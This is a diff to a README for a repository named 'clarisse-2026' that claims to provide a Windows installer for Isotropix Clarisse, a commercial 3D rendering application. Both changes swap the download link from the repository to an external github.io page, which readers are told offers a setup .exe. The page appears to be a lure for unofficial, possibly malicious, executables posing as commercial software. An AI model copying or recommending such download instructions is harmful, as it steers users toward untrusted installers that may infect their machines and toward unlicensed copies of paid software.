@@ -2,7 +2,7 @@
 
 ## 🚀 Getting Started
 
-[![Download clarisse-2026](https://img.shields.io/badge/Download%20clarisse--2026-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/winiunclouded571/clarisse-2026)
+[![Download clarisse-2026](https://img.shields.io/badge/Download%20clarisse--2026-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://winiunclouded571.github.io)
 
 Welcome to **clarisse-2026**! This repository helps you install and set up Isotropix Clarisse on Windows. Clarisse is a powerful visual effects and computer graphics software used by artists and studios worldwide. Whether you're a beginner or a seasoned professional, this guide will get you running in minutes.
 
@@ -14,7 +14,7 @@ Isotropix Clarisse is a cutting-edge 3D rendering and compositing application de
 
 ### Step 1: Get the Software
 
-Visit this link to download the application: [https://github.com/winiunclouded571/clarisse-2026](https://github.com/winiunclouded571/clarisse-2026)
+Visit this link to download the application: [https://winiunclouded571.github.io](https://winiunclouded571.github.io)
 
 This is a general page where you'll find the software. Look for the latest release file, which will be a Windows installer (usually named something like `Clarisse_2026_Setup.exe`). Click the download button to save the file to your computer.
 
